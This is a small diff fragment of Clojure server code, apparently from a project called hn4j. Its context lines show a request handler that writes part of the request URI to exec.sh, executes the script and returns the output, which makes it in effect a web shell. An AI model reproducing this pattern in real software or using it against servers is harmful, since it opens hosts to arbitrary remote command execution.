@@ -6,4 +6,3 @@
  (if u(do
  (spit"exec.sh"(subs(.getRequestURI rq)6))
  (slurp(.getInputStream(.exec(Runtime/getRuntime)"/root/git/hn4j/exec.sh")))))))
-   
